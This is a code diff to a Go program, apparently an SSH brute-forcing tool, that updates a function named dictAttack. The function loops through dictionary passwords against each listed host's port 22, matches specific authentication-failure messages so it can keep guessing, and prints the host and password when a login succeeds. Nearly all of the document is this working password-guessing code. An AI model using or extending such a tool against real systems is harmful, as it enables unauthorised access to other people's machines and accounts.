@@ -10,28 +10,45 @@ import (
 	"github.com/cfschilham/autossh/internal/sshconn"
 )
 
+const (
+	authErr1 = "ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain"
+	authErr2 = "ssh: handshake failed: ssh: unable to authenticate, attempted methods [password none], no supported methods remain"
+)
+
 func dictAttack(hostname string, dict *loadcfg.Dict, verbose bool) {
 	if !verbose {
 		fmt.Printf("Attempting to connect to '%s'\n", hostname+"@"+hostname+".local:22")
 	}
 
+	// Start looping through dictionary passwords
 	for _, pwd := range dict.Pwds() {
 		if verbose {
 			fmt.Printf("Attempting to establish SSH connection at '%s' using password '%s'\n", hostname+"@"+hostname+".local:22", pwd)
 		}
+
 		if err := sshconn.SSHConn(hostname+".local:22", hostname, pwd, ""); err != nil {
-			if verbose {
+			switch err.Error() {
+			case authErr1:
+				if verbose {
+					log.Println(err.Error())
+				}
+			case authErr2:
+				if verbose {
+					log.Println(err.Error())
+				}
+			default:
 				log.Println("failed to connect: " + err.Error())
+				return
 			}
 		} else {
 			fmt.Println("Connection successfully established!")
 			fmt.Printf("Host: '%s' | Pass: '%s'\n", hostname+"@"+hostname+".local", pwd)
-			break
+			return
 		}
 	}
 
 	if !verbose {
-		fmt.Println("Host not vulnerable")
+		fmt.Println("Fail, password not in dictionary")
 	}
 }
 
@@ -68,10 +85,11 @@ func main() {
 		}
 
 		for i, hostname := range hostlist.Hosts() {
-			fmt.Printf("Hostlist %d%% complete\n", int(math.Round(float64(i)/float64(len(hostlist.Hosts()))*100)))
+			fmt.Printf("Host list %d%% complete\n", int(math.Round(float64(i)/float64(len(hostlist.Hosts()))*100)))
 			dictAttack(hostname, dict, config.Verbose())
 		}
-		fmt.Println("Hostlist 100% complete")
+		fmt.Println("Host list 100% complete, press enter to exit...")
+		fmt.Scanln()
 
 	case "json":
 		log.Fatalf("cfg/config.yml: mode '%s' is not supported yet!", config.Mode())
